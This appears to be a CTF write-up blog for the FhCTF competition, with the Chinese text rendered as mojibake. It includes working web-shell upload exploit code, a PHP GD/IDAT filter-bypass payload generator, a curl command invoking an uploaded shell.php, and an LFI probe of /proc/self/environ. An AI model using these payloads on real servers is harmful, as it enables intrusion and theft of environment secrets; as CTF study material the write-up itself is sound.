<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="sanity-check"><a class="markdownIt-Anchor" href="#sanity-check"></a> Sanity Check</h3>
<p><img src="/images/FhCTF/1.webp" alt="image" /></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ä¸¦çœ‹å¦‚ä½•ç™¼æ”¾çå‹µã€‚</span><br><span class="line"></span><br><span class="line"><span class="code">    FhCTF&#123;S3n1ty_Ch3ck1ng....ğŸ˜&#125;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">æ„Ÿè¬æœ¬æ¬¡æ´»å‹• ISIP.HS çš„æ”¯æ´èˆ‡è´ŠåŠ©ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="christmas-tree"><a class="markdownIt-Anchor" href="#christmas-tree"></a> Christmas Tree</h3>
<p>ç¶“å…¸çš„éœå¤«æ›¼ç·¨ç¢¼é¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">with open(&#x27;encoded_gift.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    encoded = f.read().strip()</span><br><span class="line"></span><br><span class="line">with open(&#x27;huffman_tree.json&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    huffman_tree = json.load(f)</span><br><span class="line">    </span><br><span class="line">def decode_huffman(encoded_data, tree):</span><br><span class="line">    decoded = []</span><br><span class="line">    current = tree</span><br><span class="line"></span><br><span class="line">    for bit in encoded_data:</span><br><span class="line">        current = current[bit]</span><br><span class="line"></span><br><span class="line">        if isinstance(current, str):</span><br><span class="line">            decoded.append(current)</span><br><span class="line">            current = tree</span><br><span class="line"></span><br><span class="line">    return &#x27;&#x27;.join(decoded)</span><br><span class="line"></span><br><span class="line">decoded_message = decode_huffman(encoded, huffman_tree)</span><br><span class="line">print(f&quot;Decoded message: &#123;decoded_message&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Hoffman_is_<span class="built_in">a_great</span>_Christmas_tree&#125;</span><br></pre></td></tr></table></figure>
<p><strong>æˆ‘è¦åæ§½ä¸€é»éœå¤«æ›¼ç·¨ç¢¼çš„è‹±æ–‡æ˜¯&quot;Huffman&quot;ä¸æ˜¯&quot;Hoffman&quot;</strong></p>
<h3 id="é§­å®¢çš„å¯†ç¢¼é£Ÿè­œ"><a class="markdownIt-Anchor" href="#é§­å®¢çš„å¯†ç¢¼é£Ÿè­œ"></a> é§­å®¢çš„å¯†ç¢¼é£Ÿè­œ</h3>
<p>å°‡æ¯å€‹é£Ÿæçš„æ•¸å€¼è½‰æ›æˆ ASCII å­—å…ƒï¼š</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">125 </span>â†’ &#125;</span><br><span class="line"><span class="symbol">110 </span>â†’ n</span><br><span class="line"><span class="symbol">117 </span>â†’ u</span><br><span class="line"><span class="symbol">102 </span>â†’ f</span><br><span class="line"><span class="symbol">95 </span>â†’ _</span><br><span class="line"><span class="symbol">115 </span>â†’ s</span><br><span class="line"><span class="symbol">105 </span>â†’ i</span><br><span class="line"><span class="symbol">95 </span>â†’ _</span><br><span class="line"><span class="symbol">103 </span>â†’ g</span><br><span class="line"><span class="symbol">110 </span>â†’ n</span><br><span class="line"><span class="symbol">105 </span>â†’ i</span><br><span class="line"><span class="symbol">107 </span>â†’ k</span><br><span class="line"><span class="symbol">111 </span>â†’ o</span><br><span class="line"><span class="symbol">111 </span>â†’ o</span><br><span class="line"><span class="symbol">99 </span>â†’ c</span><br><span class="line"><span class="symbol">123 </span>â†’ &#123;</span><br><span class="line"><span class="symbol">70 </span>â†’ F</span><br><span class="line"><span class="symbol">84 </span>â†’ T</span><br><span class="line"><span class="symbol">67 </span>â†’ C</span><br><span class="line"><span class="symbol">104 </span>â†’ h</span><br><span class="line"><span class="symbol">70 </span>â†’ F</span><br></pre></td></tr></table></figure>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;cooking<span class="number">_</span><span class="keyword">is</span><span class="number">_f</span>un&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ç¬‘è©±å¤§å¸«"><a class="markdownIt-Anchor" href="#ç¬‘è©±å¤§å¸«"></a> ç¬‘è©±å¤§å¸«</h3>
<p><strong>æ­å–œé€™é¡Œè¢«è©•ç‚ºæœ€é³¥çš„ä¸€é¡Œ</strong><br />
<s>æˆ‘å°±åªæ˜¯è¼¸å…¥ä¸€å€‹?</s><br />
<img src="/images/FhCTF/2.webp" alt="image" /></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;thisi_Prompt_Injection&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆ†äº«åœ–åº«"><a class="markdownIt-Anchor" href="#åˆ†äº«åœ–åº«"></a> åˆ†äº«åœ–åº«</h3>
<p>ä¸€é€²ä¾†æˆ‘å€‘å¯ä»¥çœ‹åˆ°é€™å€‹ä»‹é¢åªå…è¨± PNG ä¸Šå‚³<br />
<img src="/images/FhCTF/3.webp" alt="image" /><br />
ç™¼ç¾ PNG æœ‰å›ºå®šçš„ 8 å­—ç¯€æ¨™é ­ï¼Œé‚£æˆ‘å€‘å°±å¯ä»¥åœ¨æ¨™é ­ä¹‹å¾Œæ·»åŠ  PHP ä»£ç¢¼</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">png_header = (</span><br><span class="line">    <span class="string">b&#x27;<span class="char escape_">\x</span>89<span class="char escape_">\x</span>50<span class="char escape_">\x</span>4E<span class="char escape_">\x</span>47<span class="char escape_">\x</span>0D<span class="char escape_">\x</span>0A<span class="char escape_">\x</span>1A<span class="char escape_">\x</span>0A<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>0D<span class="char escape_">\x</span>49<span class="char escape_">\x</span>48<span class="char escape_">\x</span>44<span class="char escape_">\x</span>52&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>01<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>01<span class="char escape_">\x</span>08<span class="char escape_">\x</span>06<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>1F<span class="char escape_">\x</span>15<span class="char escape_">\x</span>C4&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;<span class="char escape_">\x</span>89<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>0A<span class="char escape_">\x</span>49<span class="char escape_">\x</span>44<span class="char escape_">\x</span>41<span class="char escape_">\x</span>54<span class="char escape_">\x</span>78<span class="char escape_">\x</span>9C<span class="char escape_">\x</span>63<span class="char escape_">\x</span>00<span class="char escape_">\x</span>01<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;<span class="char escape_">\x</span>05<span class="char escape_">\x</span>00<span class="char escape_">\x</span>01<span class="char escape_">\x</span>0D<span class="char escape_">\x</span>0A<span class="char escape_">\x</span>2D<span class="char escape_">\x</span>B4<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>00<span class="char escape_">\x</span>49<span class="char escape_">\x</span>45<span class="char escape_">\x</span>4E<span class="char escape_">\x</span>44<span class="char escape_">\x</span>AE&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;<span class="char escape_">\x</span>42<span class="char escape_">\x</span>60<span class="char escape_">\x</span>82&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>æ§‹å»º PHP Payload: å˜—è©¦å¤šç¨®æŒ‡ä»¤è®€å–æ–¹å¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">php_code = b<span class="string">&#x27;\n\n&lt;pre&gt;__START__\n&lt;?php system(&quot;env || printenv&quot;); ?&gt;\n__END__&lt;/pre&gt;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">file_content = png_header + php_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(f<span class="string">&quot;[*] Uploading payload to &#123;UPLOAD_URL&#125;...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    files = &#123;<span class="string">&#x27;fileToUpload&#x27;</span>: (FILENAME, file_content, <span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line">    data = &#123;<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;Upload Image&#x27;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(UPLOAD_URL, files=files, data=data, timeout=<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;has been uploaded&quot;</span> in r.text:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;[+] Upload ful!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;[-] Upload failed.&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;Status Code: &#123;r.status_code&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;Response Snippet:&quot;</span>, r.text[:<span class="number">300</span>])</span><br><span class="line">        sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    exploit_url = TARGET_URL + <span class="string">&quot;uploads/&quot;</span> + FILENAME</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;[*] Executing payload at &#123;exploit_url&#125;...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    r_exec = requests.<span class="title function_ invoke__">get</span>(exploit_url, timeout=<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> r_exec.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;[-] Error: 404 Not Found.&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;    The file might have been deleted by cleanup scripts or the upload path is different.&quot;</span>)</span><br><span class="line">        sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    content = r_exec.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    flag_match = re.<span class="title function_ invoke__">search</span>(r<span class="string">&#x27;(FhCTF\&#123;.*?\&#125;)&#x27;</span>, content)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> flag_match:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;\n[] Flag found:\n&#123;flag_match.group(1)&#125;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        start = content.<span class="title function_ invoke__">find</span>(<span class="string">&quot;__START__&quot;</span>)</span><br><span class="line">        end = content.<span class="title function_ invoke__">find</span>(<span class="string">&quot;__END__&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start != -<span class="number">1</span> <span class="keyword">and</span> end != -<span class="number">1</span>:</span><br><span class="line">            output = content[start+<span class="number">9</span>:end].<span class="title function_ invoke__">strip</span>()</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;\n[+] Command Output (env):&quot;</span>)</span><br><span class="line">            <span class="keyword">print</span>(output)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> in output.<span class="title function_ invoke__">lower</span>():</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;\n[!] &#x27;flag&#x27; keyword found in output, please check manually above.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;\n[-] Flag pattern not found automatically.&quot;</span>)</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;Raw response preview (check manually):&quot;</span>)</span><br><span class="line">            <span class="keyword">print</span>(content[:<span class="number">500</span>])</span><br><span class="line"></span><br><span class="line">except requests.exceptions.ConnectionError:</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;\n[-] Connection Error: Could not connect to &#123;TARGET_URL&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;    Please check if the CTF instance is still running or if the URL has changed.&quot;</span>)</span><br><span class="line">except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;\n[-] An error occurred: &#123;e&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">09801</span>\Downloads\gallery&gt; &amp; C:/Users/<span class="number">09801</span>/AppData/Local/Microsoft/WindowsApps/python3.<span class="number">13</span>.exe c:/Users/<span class="number">09801</span>/Downloads/gallery/test.py </span><br><span class="line">[*] Target <span class="built_in">set</span> to: http://<span class="number">8608</span>faf0.fhctf.systems/</span><br><span class="line">[*] Uploading payload to http://<span class="number">8608</span>faf0.fhctf.systems/upload.php...</span><br><span class="line">[+] Upload ful!</span><br><span class="line">[*] Executing payload at http://<span class="number">8608</span>faf0.fhctf.systems/uploads/avatar.php...</span><br><span class="line"></span><br><span class="line">[] Flag found:</span><br><span class="line">FhCTF&#123;png_format?Cannot_stop_php!&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">09801</span>\Downloads\gallery&gt; </span><br></pre></td></tr></table></figure>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;png_format?Cannot_stop_php!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="åˆ†äº«åœ–åº«-revenge"><a class="markdownIt-Anchor" href="#åˆ†äº«åœ–åº«-revenge"></a> åˆ†äº«åœ–åº« Revenge</h3>
<p><img src="/images/FhCTF/3.webp" alt="image" /><br />
ç›®æ¨™ (Goal)ï¼š Dockerfile ç¬¬ 14 è¡Œé¡¯ç¤º Flag å„²å­˜åœ¨ç’°å¢ƒè®Šæ•¸ä¸­ï¼šENV flag=&quot;FhCTF{fake_flag}&quot;ã€‚ å› æ­¤ï¼Œæˆ‘å€‘çš„ç›®æ¨™æ˜¯åŸ·è¡Œ PHP ç¨‹å¼ç¢¼ä¾†è®€å–ç’°å¢ƒè®Šæ•¸ï¼ˆä¾‹å¦‚ä½¿ç”¨ getenv('flag') æˆ– $_ENVï¼‰ã€‚</p>
<p>æ¼æ´å…¥å£ (Vulnerability)ï¼š upload.php è² è²¬è™•ç†ä¸Šå‚³ã€‚</p>
<p>æª¢æŸ¥æ©Ÿåˆ¶ï¼šå®ƒæœƒæª¢æŸ¥æª”æ¡ˆæ˜¯å¦ç‚º PNG (exif_imagetype)ï¼Œä¸¦å˜—è©¦ç”¨ GD è¼‰å…¥ (imagecreatefrompng)ã€‚é€™é˜²æ­¢äº†å–®ç´”çš„ã€Œæ”¹å‰¯æª”åã€æˆ–ã€Œæ–‡ä»¶å°¾é™„åŠ  PHP ä»£ç¢¼ã€ã€‚</p>
<p>æ¸…æ´—æ©Ÿåˆ¶ (Sanitization)ï¼šæœ€é—œéµçš„æ˜¯ç¬¬ 49 è¡Œ imagepng($img, $target_file)ã€‚é€™æœƒé‡ç¹ªåœ–ç‰‡ä¸¦å­˜æª”ã€‚ä¸€èˆ¬çš„ Web Shellï¼ˆä¾‹å¦‚åœ¨åœ–ç‰‡çµå°¾åŠ  <?php system(...) ?>ï¼‰ç¶“éé€™å€‹æ­¥é©Ÿå¾Œï¼Œé™„åŠ çš„ä»£ç¢¼æœƒè¢«ä¸Ÿæ£„ï¼Œåªå‰©ä¸‹ç´”åœ–ç‰‡æ•¸æ“šã€‚</p>
<p>æª”åæ¼æ´ï¼šç¬¬ 7 è¡Œ $target_file = $target_dir . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);ã€‚ä¼ºæœå™¨ç›´æ¥ä½¿ç”¨äº†ä½ ä¸Šå‚³çš„æª”åèˆ‡å‰¯æª”åã€‚å¦‚æœä½ ä¸Šå‚³ shell.phpï¼Œå®ƒå°±æœƒå­˜æˆ uploads/shell.phpã€‚</p>
<ol start="2">
<li>è§£é¡Œæ€è·¯ (Strategy)<br />
æˆ‘å€‘éœ€è¦åˆ©ç”¨ &quot;PHP GD Bypass&quot; æŠ€è¡“ã€‚ æˆ‘å€‘éœ€è¦æ§‹é€ ä¸€å€‹ç‰¹æ®Šçš„ PNG åœ–ç‰‡ï¼Œä½¿å¾—å®ƒåœ¨è¢« imagecreatefrompng è®€å–ä¸¦ç”± imagepng é‡æ–°å£“ç¸®å¯«å…¥å¾Œï¼Œæ–°çš„åœ–ç‰‡æ•¸æ“šæµä¸­ä»ç„¶åŒ…å« PHP ä»£ç¢¼ã€‚</li>
</ol>
<p>é€™é€šå¸¸æ˜¯é€éæ“æ§ PNG çš„ IDAT å¡Šï¼ˆåƒç´ æ•¸æ“šï¼‰ä¾†é”æˆã€‚ç•¶é€™äº›åƒç´ è¢«å£“ç¸®ç®—æ³•è™•ç†æ™‚ï¼Œæœƒå‰›å¥½çµ„æˆé¡ä¼¼ <?=$_GET[0]($_POST[1]);?> çš„å­—ä¸²ã€‚</p>
<ol start="3">
<li>æ”»æ“Šæ­¥é©Ÿ (Step-by-Step)<br />
ç¬¬ä¸€æ­¥ï¼šç”Ÿæˆ Payload<br />
ä½ éœ€è¦ä¸€å€‹è…³æœ¬ä¾†ç”Ÿæˆé€™ç¨®ã€ŒæŠ—æ¸…æ´—ã€çš„ PNGã€‚ä»¥ä¸‹æ˜¯ä¸€å€‹å¸¸ç”¨çš„ç”Ÿæˆè…³æœ¬ï¼ˆåŸºæ–¼åœ‹å¤–ç ”ç©¶å“¡çš„ IDAT/PLTE Bypass æŠ€è¡“ï¼‰ã€‚</li>
</ol>
<p>è«‹å°‡ä»¥ä¸‹ç¨‹å¼ç¢¼å­˜ç‚º gen_payload.php ä¸¦åœ¨ä½ çš„é›»è…¦ä¸Šç”¨ PHP åŸ·è¡Œå®ƒï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                        <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>, <span class="string">&#x27;payload.webp&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Payload generated: payload.webp\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">åŸ·è¡Œå¾Œæœƒå¾—åˆ° payload.webpã€‚é€™å€‹åœ–ç‰‡çš„ç‰¹æ€§æ˜¯ï¼šå³ä½¿ç¶“é imagecreatefrompng å† imagepngï¼Œè£¡é¢çš„ Hex æ•¸æ“šä»æœƒåŒ…å« PHP å¾Œé–€ã€‚</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒæ­¥ï¼šæº–å‚™æ”»æ“Šæª”æ¡ˆ<br />
å°‡ç”Ÿæˆçš„ payload.webp é‡æ–°å‘½åç‚º shell.phpã€‚</p>
<p>ä¼ºæœå™¨æª¢æŸ¥å…§å®¹ï¼šå®ƒæ˜¯åˆæ³•çš„ PNGï¼ˆé€šéï¼‰ã€‚</p>
<p>ä¼ºæœå™¨å­˜æª”ï¼šå­˜ç‚º .phpï¼ˆå› ç‚ºæˆ‘å€‘æª”åæ˜¯ .phpï¼‰ã€‚</p>
<p>ä¼ºæœå™¨æ¸…æ´—ï¼šPayload çš„æ§‹é€ ç‰¹æ€§è®“å®ƒåœ¨æ¸…æ´—å¾Œï¼ŒPHP ä»£ç¢¼ä¾ç„¶å­˜åœ¨ã€‚</p>
<p>ç¬¬ä¸‰æ­¥ï¼šä¸Šå‚³èˆ‡åŸ·è¡Œ<br />
å›åˆ°é¡Œç›®ç¶²é ï¼Œä¸Šå‚³ shell.phpã€‚</p>
<p>å› ç‚ºæˆ‘å€‘çš„ Payload æ˜¯ <?=$_GET[0];?>ï¼Œæˆ‘å€‘å¯ä»¥ç”¨ GET åƒæ•¸å‚³å…¥æŒ‡ä»¤ã€‚<br />
<code>curl.exe &quot;http://b1baf89e.fhctf.systems/uploads/shell.php?0=system&quot; -d &quot;1=env&quot; --output - | Select-String &quot;FhCTF&quot;</code></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;But_I_CAN_WRITE_PHP_IN_IDAT_CHUNK&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="python-compile"><a class="markdownIt-Anchor" href="#python-compile"></a> Python Compile</h3>
<p>åœ¨ç¨‹å¼ç¢¼éŒ¯èª¤æ™‚æœƒé¡¯ç¤º <code>Syntax Error</code>ï¼Œä»£è¡¨åœ¨è™•ç†éŒ¯èª¤æ™‚é‚„æ˜¯æœƒè®€åˆ°æª”æ¡ˆ<br />
å¯ä»¥æ¨æ¸¬å¯èƒ½ç‚º<code>LFI</code> é¡Œã€‚</p>
<p>åœ¨ç¨‹å¼ç¢¼è¼¸å…¥æ¡†éš¨æ„è¼¸å…¥æœƒé€ æˆèªæ³•éŒ¯èª¤çš„ Python ç¨‹å¼ç¢¼ä¸¦é€å‡ºï¼Œé é¢æœƒé¡¯ç¤º <code>Syntax Error</code>ï¼Œä¸”éŒ¯èª¤è¨Šæ¯åŒ…å« &quot;Line N&quot; èˆ‡è©²è¡Œå…§å®¹çš„å›é¡¯ã€‚</p>
<p>ç”±éŒ¯èª¤å¯æ¨æ¸¬ï¼Œå¾Œç«¯åœ¨æ¸²æŸ“ <code>Syntax Error</code> æ™‚ï¼Œæœƒä¾è¡Œæ•¸è®€å–ä¾†æºæª”æ¡ˆçš„å°æ‡‰è¡Œå…§å®¹ï¼Œä¸”è®€æª”ç›®æ¨™ä¾†è‡ªä½¿ç”¨è€…çš„ <code>filename</code>ï¼›é€™å½¢æˆæœ¬åœ°æª”æ¡ˆè®€å–ï¼ˆLFIï¼‰é¢¨éšªã€‚</p>
<p>ä»¥ PoC é©—è­‰ï¼Œå°‡requestä¸­çš„ <code>filename</code> æ”¹ç‚ºsystem pathï¼ˆå¦‚ <code>/proc/self/environ</code>ï¼‰ï¼ŒåŒæ™‚ç¶­æŒèªæ³•éŒ¯èª¤çš„ç¨‹å¼ç¢¼ï¼Œè§€å¯ŸéŒ¯èª¤è¨Šæ¯æ˜¯å¦é¡¯ç¤ºè©²æª”æ¡ˆå…§å®¹ã€‚</p>
